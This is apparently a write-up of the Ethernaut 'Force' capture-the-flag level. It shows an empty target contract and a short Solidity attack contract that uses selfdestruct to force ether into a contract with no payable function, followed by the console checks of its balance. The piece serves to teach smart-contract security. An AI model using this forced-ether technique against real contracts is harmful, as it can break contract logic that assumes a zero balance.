<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel7.svg">

## Look Over Target Contract

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

Challenge's message.

> Some contracts will simply not take your money ¯\_(ツ)_/¯
The goal of this level is to make the balance of the contract greater than zero.

Our aim should be send ether to target contract to solve this challenge.

## Subverting

My attack contract.

```solidity
pragma solidity ^0.8.0;

contract Attack{

    address payable target;

    constructor(address payable _target){
        target = _target;
    }

    function attack()public payable{
        selfdestruct(target);
    }
}
```

In the starting point, identify the contart address which is our target. Afterwards, send ether to target contract with ```selfdestruct()``` method. With help of selfdestruct, contracts can be deleted from the blockchain and selfdestruct **sends all remaining ether stored in the contract** to a designated address. For this reason,
a malicious contract can use **selfdestruct** to force sending Ether to any contract.

Deploy and call attack function.

```shell
await instance
'0x2C5eB5feC2C02C4bAba25DfD9e9E9092967Bde51'
```

<img src="">

```shell
await getBalance(instance)
'0.00000000000000001'
```
